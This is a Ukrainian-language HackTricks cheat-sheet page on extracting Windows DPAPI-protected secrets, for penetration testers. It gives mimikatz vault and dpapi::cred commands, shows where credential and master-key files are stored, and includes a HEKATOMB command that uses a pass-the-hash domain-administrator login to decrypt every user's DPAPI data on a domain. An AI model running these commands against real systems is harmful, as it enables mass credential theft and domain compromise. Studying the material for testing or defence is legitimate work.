# DPAPI - Витягування паролів

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Чи працюєте ви в **кібербезпеці компанії**? Хочете побачити вашу **компанію рекламовану на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**репозиторію hacktricks**](https://github.com/carlospolop/hacktricks) **та** [**репозиторію hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) є найбільш важливою подією з кібербезпеки в **Іспанії** та однією з найважливіших в **Європі**. З метою просування технічних знань, цей конгрес є важливою точкою зустрічі для професіоналів технологій та кібербезпеки у будь-якій галузі.

{% embed url="https://www.rootedcon.com/" %}

## Що таке DPAPI

API захисту даних (DPAPI) в основному використовується в операційній системі Windows для **симетричного шифрування асиметричних приватних ключів**, використовуючи як користувацькі, так і системні секрети як значний джерело ентропії. Цей підхід спрощує шифрування для розробників, дозволяючи їм шифрувати дані за допомогою ключа, отриманого з секретів входу користувача або, для системного шифрування, секретів аутентифікації домену системи, тим самим уникнувши необхідності для розробників управляти захистом ключа шифрування самостійно.

### Захищені дані за допомогою DPAPI

Серед особистих даних, захищених за допомогою DPAPI, є:

- Паролі та дані автозаповнення для Інтернет-провайдера та Google Chrome
- Паролі для електронної пошти та внутрішні паролі FTP для додатків, таких як Outlook та Windows Mail
- Паролі для спільних папок, ресурсів, бездротових мереж та сховища Windows, включаючи ключі шифрування
- Паролі для віддалених підключень до робочого столу, .NET Passport та приватні ключі для різних цілей шифрування та аутентифікації
- Мережеві паролі, керовані Менеджером облікових записів та особисті дані в додатках, що використовують CryptProtectData, такі як Skype, MSN Messenger та інші

## Список сховища
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Файли облікових даних

**Файли облікових даних, захищені** можуть бути розташовані в:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Отримати інформацію про облікові дані за допомогою mimikatz `dpapi::cred`, у відповіді можна знайти цікаву інформацію, таку як зашифровані дані та guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Ви можете використовувати модуль **mimikatz** `dpapi::cred` з відповідним `/masterkey` для розшифрування:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Майстер-ключі

Ключі DPAPI, які використовуються для шифрування RSA-ключів користувача, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де {SID} - це [**Ідентифікатор безпеки**](https://en.wikipedia.org/wiki/Security\_Identifier) **цього користувача**. **Ключ DPAPI зберігається в тому ж файлі, що й майстер-ключ, який захищає приватні ключі користувачів**. Зазвичай це 64 байти випадкових даних. (Зверніть увагу, що цей каталог захищений, тому ви не можете переглянути його, використовуючи `dir` з cmd, але ви можете переглянути його з PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Це виглядатиме як купа майстер-ключів користувача:

![](<../../.gitbook/assets/image (324).png>)

Зазвичай **кожен майстер-ключ є зашифрованим симетричним ключем, який може розшифрувати інший вміст**. Тому **витягнення зашифрованого майстер-ключа** цікаве для **розшифрування** пізніше того **іншого вмісту**, зашифрованого ним.

### Вилучення майстер-ключа та розшифрування

Перевірте посилання [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) для прикладу того, як вилучити майстер-ключ та розшифрувати його.


## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) - це порт C# деякої функціональності DPAPI від [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) проекту.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) - це інструмент, який автоматизує вилучення всіх користувачів та комп'ютерів з каталогу LDAP та вилучення резервного ключа контролера домену через RPC. Сценарій потім вирішить всі IP-адреси комп'ютерів та виконає smbclient на всіх комп'ютерах, щоб отримати всі блоки DPAPI всіх користувачів та розшифрувати все за допомогою резервного ключа домену.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

З вилученого списку комп'ютерів з LDAP ви можете знайти кожну підмережу, навіть якщо ви про них не знали!

"Тому що права адміністратора домену недостатньо. Взламайте їх всіх."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) може автоматично витягувати секрети, захищені DPAPI.

## Посилання

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) - найбільш важлива подія з кібербезпеки в **Іспанії** та одна з найважливіших в **Європі**. З метою просування технічних знань, цей конгрес є плідним місцем зустрічі для професіоналів технологій та кібербезпеки у будь-якій дисципліні.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Вивчайте взлом AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Ви працюєте в **кібербезпеці**? Хочете побачити, як ваша **компанія рекламується в HackTricks**? або ви хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Приєднуйтесь до [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною в **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилаючи PR до** [**репозиторію hacktricks**](https://github.com/carlospolop/hacktricks) **та** [**репозиторію hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
